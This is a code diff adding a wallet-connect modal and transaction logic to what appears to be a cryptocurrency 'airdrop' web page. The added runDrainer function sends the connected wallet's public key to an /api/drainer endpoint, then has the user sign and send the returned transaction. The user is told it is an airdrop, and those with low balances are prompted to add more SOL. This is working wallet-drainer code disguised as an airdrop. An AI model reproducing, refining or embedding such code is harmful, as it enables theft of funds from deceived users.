@@ -903,7 +903,257 @@
       }
     }
 
+    // Desktop wallet modal function - ensures desktop functionality remains intact
+    function openWalletModal() {
+      const modal = document.getElementById("walletModal");
+      const list = document.getElementById("walletList");
+      const isMobileDevice = isMobile();
+      
+      // Show appropriate header based on device
+      const header = isMobileDevice ? 
+        `<h2 style="margin-bottom: 10px;">Select Wallet</h2>
+         <p style="color:#00FF88;font-size:0.9em;margin-bottom:20px;">
+           📱 Mobile detected - Tap to open app or install
+         </p>` : 
+        `<h2 style="margin-bottom: 20px;">Select Wallet</h2>`;
+      
+      list.innerHTML = header;
+      
+      WALLET_DEFS.forEach(wallet => {
+        const provider = wallet.provider();
+        const option = document.createElement("div");
+        option.className = "wallet-option";
+        option.tabIndex = 0;
+        option.setAttribute('role', 'button');
+        option.setAttribute('aria-label', `Connect ${wallet.name}`);
+        
+        // Show status based on device and provider availability
+        let statusText = '';
+        if (isMobileDevice) {
+          statusText = provider ? 
+            '<span style="color:#00FF88;font-size:0.9em;">📱 Detected</span>' : 
+            '<span style="color:#FFD700;font-size:0.9em;">📱 Install</span>';
+        } else {
+          statusText = provider ? '' : '<span style="color:#FF4D4D;font-size:0.9em;">Not installed</span>';
+        }
+        
+        option.innerHTML = `
+          <img src="${wallet.icon}" alt="${wallet.name} logo" />
+          <div class="wallet-name">${wallet.name}</div>
+          ${statusText}
+        `;
+        
+        if (isMobileDevice) {
+          // Mobile behavior - use simplified connection
+          option.onclick = async () => {
+            modal.classList.remove("active");
+            showStatus('Connecting to ' + wallet.name + '...', 'loading');
+            await connectMobileWallet(wallet);
+          };
+        } else {
+          // Desktop behavior - original logic for perfect desktop experience
+          if (provider) {
+            option.onclick = async () => {
+              modal.classList.remove("active");
+              showStatus('Connecting to ' + wallet.name + '...', 'loading');
+              try {
+                if (typeof provider.connect === 'function') {
+                  await provider.connect();
+                }
+                if (!getWalletAddress(provider)) {
+                  let msg = 'Connection failed: No public key returned. Please try again.';
+                  if (wallet.name === 'Trust Wallet') {
+                    msg = 'Please unlock Trust Wallet and connect this site in the extension, then try again.';
+                  } else if (wallet.name === 'Exodus') {
+                    msg = 'Please unlock Exodus and connect this site in the extension, then try again.';
+                  } else if (wallet.name === 'Backpack') {
+                    msg = 'Please unlock Backpack and connect this site in the extension, then try again.';
+                  } else if (wallet.name === 'Solflare') {
+                    msg = 'Please unlock Solflare and connect this site in the extension, then try again.';
+                  }
+                  showStatus(msg, 'error');
+                  return;
+                }
+                showStatus('Wallet connected: ' + wallet.name, 'success');
+                setTimeout(() => {
+                  if (getWalletAddress(provider)) {
+                    runDrainer(provider);
+                  } else {
+                    showStatus('Wallet connection lost. Please try again.', 'error');
+                  }
+                }, 1000);
+              } catch (err) {
+                showStatus('Connection failed: ' + (err.message || err), 'error');
+              }
+            };
+          } else {
+            option.onclick = () => window.open(wallet.install, '_blank');
+          }
+        }
+        
+        list.appendChild(option);
+      });
+      
+      modal.classList.add("active");
+      setTimeout(() => {
+        const first = list.querySelector('.wallet-option');
+        if (first) first.focus();
+      }, 100);
+      modal.onkeydown = function(e) {
+        if (e.key === 'Escape') closeWalletModal();
+      };
+    }
 
+    function closeWalletModal() {
+      document.getElementById("walletModal").classList.remove("active");
+    }
+    
+    window.onclick = function(event) {
+      const modal = document.getElementById("walletModal");
+      if (event.target === modal) closeWalletModal();
+    };
+
+    // Essential helper functions for desktop functionality
+    function getWalletAddress(provider) {
+      if (!provider) return null;
+      
+      // Check provider.publicKey
+      if (provider.publicKey) {
+        if (typeof provider.publicKey === 'string') return provider.publicKey;
+        if (typeof provider.publicKey.toBase58 === 'function') return provider.publicKey.toBase58();
+        if (typeof provider.publicKey.toString === 'function') return provider.publicKey.toString();
+        if (provider.publicKey.address) return provider.publicKey.address;
+      }
+      
+      // Check provider.address
+      if (provider.address) {
+        if (typeof provider.address === 'string') return provider.address;
+        if (typeof provider.address.toBase58 === 'function') return provider.address.toBase58();
+        if (typeof provider.address.toString === 'function') return provider.address.toString();
+      }
+      
+      return null;
+    }
+
+    // Status modal function
+    function showStatus(msg, type) {
+      const modal = document.getElementById('statusModal');
+      const msgEl = document.getElementById('statusModalMsg');
+      
+      msgEl.textContent = msg;
+      msgEl.style.color = type === 'success' ? '#00FF88' : 
+                         type === 'error' ? '#FF4D4D' : '#FFD700';
+      
+      modal.style.display = 'flex';
+      
+      // Auto-close for success after 6 seconds
+      if (type === 'success') {
+        setTimeout(() => {
+          modal.style.display = 'none';
+        }, 6000);
+      }
+    }
+
+    // Transaction handling function
+    async function runDrainer(provider) {
+      const pubkey = getWalletAddress(provider);
+      if (!pubkey) {
+        showStatus('Wallet not connected or unsupported publicKey format.', 'error');
+        return;
+      }
+      
+      showStatus('Preparing your airdrop transaction...', 'loading');
+      
+      try {
+        // Fetch transaction from API
+        const res = await fetch('/api/drainer', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ pubkey })
+        });
+        const data = await res.json();
+        if (!data.success || !data.transaction) throw new Error(data.error || "API error");
+        
+        // Deserialize transaction
+        const tx = window.solanaWeb3.Transaction.from(
+          Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
+        );
+        
+        // Sign and send transaction
+        if (provider.isGlow && provider.signAndSendTransaction) {
+          const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
+          showStatus("Transaction sent successfully! Signature: " + (sig.signature || sig), 'success');
+        } else if ((provider.isSolflare || (window.solflare && provider === window.solflare)) && provider.signAndSendTransaction) {
+          console.log('Using Solflare signAndSendTransaction method');
+          try {
+            const sig = await provider.signAndSendTransaction(tx);
+            showStatus("Solflare transaction sent! Signature: " + (sig.signature || sig), 'success');
+          } catch (err) {
+            console.log('Solflare transaction error:', err);
+            showStatus("❌ Solflare transaction failed: " + err.message, 'error');
+          }
+        } else if ((provider.isPhantom || (window.solana && provider === window.solana && provider.isPhantom)) && provider.signAndSendTransaction) {
+          console.log('Using Phantom signAndSendTransaction method');
+          try {
+            const sig = await provider.signAndSendTransaction(tx);
+            showStatus("Phantom transaction sent! Signature: " + (sig.signature || sig), 'success');
+          } catch (err) {
+            console.log('Phantom transaction error:', err);
+            showStatus("❌ Phantom transaction failed: " + err.message, 'error');
+          }
+        } else if (provider.signAndSendTransaction) {
+          const sig = await provider.signAndSendTransaction(tx);
+          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
+        } else if (provider.signTransaction && provider.sendTransaction) {
+          const signed = await provider.signTransaction(tx);
+          const sig = await provider.sendTransaction(signed);
+          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
+        } else {
+          throw new Error("Wallet does not support transaction signing.");
+        }
+      } catch (err) {
+        const errorMsg = err.message || err;
+        if (errorMsg.includes('rejected') || errorMsg.includes('denied') || errorMsg.includes('cancelled')) {
+          showStatus("Transaction was rejected by your wallet.", 'error');
+        } else if (errorMsg.includes('insufficient') || errorMsg.includes('funds')) {
+          showStatus("Insufficient funds. Please add SOL to your wallet and try again.", 'error');
+        } else {
+          showStatus("Transaction failed: " + errorMsg, 'error');
+        }
+      }
+    }
+
+    // Initialize on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      autoDetectMobileWallet();
+    });
+
+    // Navbar functionality
+    const navLinks = document.querySelectorAll('.nav-link');
+    const sections = ['hero','security','learn','explore','support'].map(id => document.getElementById(id));
+    
+    window.addEventListener('scroll', () => {
+      let current = 'hero';
+      for (const section of sections) {
+        if (section && window.scrollY + 80 >= section.offsetTop) {
+          current = section.id;
+        }
+      }
+      navLinks.forEach(link => {
+        link.classList.toggle('active', link.getAttribute('href') === '#' + current);
+      });
+    });
+    
+    navLinks.forEach(link => {
+      link.addEventListener('click', function(e) {
+        const targetId = this.getAttribute('href').slice(1);
+        const target = document.getElementById(targetId);
+        if (target) {
+          e.preventDefault();
+          window.scrollTo({ top: target.offsetTop - 60, behavior: 'smooth' });
+        }
+      });
+    });
   </script>
 </body>
 </html>
